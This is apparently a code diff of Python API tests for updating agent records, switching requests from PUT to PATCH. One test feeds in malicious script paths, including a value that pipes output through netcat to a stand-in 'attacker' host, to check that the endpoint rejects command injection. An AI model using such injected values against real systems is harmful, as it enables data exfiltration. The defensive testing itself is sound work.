@@ -202,7 +202,7 @@ class TestUpdateAgent:
         agent = _agent_mock()
         mock_db.query.return_value.filter.return_value.first.return_value = agent
         mock_db.refresh.return_value = None
-        resp = client_superadmin.put(
+        resp = client_superadmin.patch(
             f"/api/v1/agents/{AGENT_ID}",
             json={"name": "UpdatedAgent", "txt_output_path": "/new/path"},
         )
@@ -211,14 +211,14 @@ class TestUpdateAgent:
 
     def test_agent_not_found_returns_404(self, client_superadmin, mock_db) -> None:
         mock_db.query.return_value.filter.return_value.first.return_value = None
-        resp = client_superadmin.put(
+        resp = client_superadmin.patch(
             f"/api/v1/agents/{AGENT_ID}",
             json={"name": "X"},
         )
         assert resp.status_code == 404
 
     def test_editor_returns_403(self, client_editor, mock_db) -> None:
-        resp = client_editor.put(
+        resp = client_editor.patch(
             f"/api/v1/agents/{AGENT_ID}",
             json={"name": "X"},
         )
@@ -243,7 +243,7 @@ class TestUpdateAgent:
             "/opt/scripts/ingest.py | nc attacker 4444",
         ]
         for p in malicious_paths:
-            resp = client_superadmin.put(
+            resp = client_superadmin.patch(
                 f"/api/v1/agents/{AGENT_ID}",
                 json={"ingest_script_path": p},
             )
